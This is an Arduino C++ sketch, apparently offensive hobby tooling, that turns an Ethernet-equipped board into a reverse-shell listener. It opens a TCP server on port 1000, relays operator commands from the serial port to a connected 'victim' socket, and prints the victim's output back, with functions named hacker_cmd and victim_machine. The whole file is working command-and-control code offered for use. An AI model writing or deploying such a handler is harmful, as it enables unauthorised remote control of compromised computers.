/*
 __    __  __            __          __                       ______           __     ______  
/  \  /  |/  |          /  |        /  |                     /      \        _/  |   /      \ 
$$  \ $$ |$$/   ______  $$ |____   _$$ |_           ______  /$$$$$$  |      / $$ |  /$$$$$$  |
$$$  \$$ |/  | /      \ $$      \ / $$   |         /      \ $$ |_ $$/       $$$$ |  $$ \__$$ |
$$$$  $$ |$$ |/$$$$$$  |$$$$$$$  |$$$$$$/         /$$$$$$  |$$   |            $$ |  $$    $$ |
$$ $$ $$ |$$ |$$ |  $$ |$$ |  $$ |  $$ | __       $$ |  $$ |$$$$/             $$ |   $$$$$$$ |
$$ |$$$$ |$$ |$$ \__$$ |$$ |  $$ |  $$ |/  |      $$ \__$$ |$$ |             _$$ |_ /  \__$$ |
$$ | $$$ |$$ |$$    $$ |$$ |  $$ |  $$  $$/       $$    $$/ $$ |            / $$   |$$    $$/ 
$$/   $$/ $$/  $$$$$$$ |$$/   $$/    $$$$/         $$$$$$/  $$/             $$$$$$/  $$$$$$/  
              /  \__$$ |                                                                      
              $$    $$/                             Version:V1.0                                          
               $$$$$$/                           @https://github.com/MartinxMax
*/
#define MACADDRESS 0x00, 0x01, 0x02, 0x03, 0x04, 0x05
#define MYIPADDR 192, 168, 8, 102
#define MYIPMASK 255, 255, 255, 0
#define MYDNS 192, 168, 8, 1
#define MYGW 192, 168, 8, 1
#define LISTENPORT 1000
#define UARTBAUD 9600
#include <UIPEthernet.h>

EthernetServer server = EthernetServer(LISTENPORT);
void setup() {
  Serial.begin(UARTBAUD);
  uint8_t mac[6] = { MACADDRESS };
  uint8_t myIP[4] = { MYIPADDR };
  uint8_t myMASK[4] = { MYIPMASK };
  uint8_t myDNS[4] = { MYDNS };
  uint8_t myGW[4] = { MYGW };
  Ethernet.begin(mac, myIP, myDNS, myGW, myMASK);
  server.begin();
}

String hacker_cmd() {
  String CMD;
  while (Serial.available()) {
    char c = Serial.read();
    CMD += c;
  }
  Serial.print(CMD);
  return CMD;
}

void victim_machine() {
  EthernetClient VICTIM_SOCKET = server.available();
  String victim_result = "";
  String CMD = "";
  if (VICTIM_SOCKET) {
    while (VICTIM_SOCKET.connected()) {
      if (Serial.available() > 0) {
        CMD = hacker_cmd();
        delay(400);
      }
      if (CMD) {
        VICTIM_SOCKET.println(CMD);
        CMD = "";
        delay(1000);
      } else {
        VICTIM_SOCKET.println("");
        delay(5000);
      }
      while ((VICTIM_SOCKET.available()) > 0) {
        char c = VICTIM_SOCKET.read();
        victim_result += c;
      }

      Serial.print(victim_result);
      victim_result = "";
      if (!VICTIM_SOCKET.connected()) {
        Serial.print("ERROR");
        break;
      }
    }
    VICTIM_SOCKET.stop();
  }
}

void loop() {
  victim_machine();
}
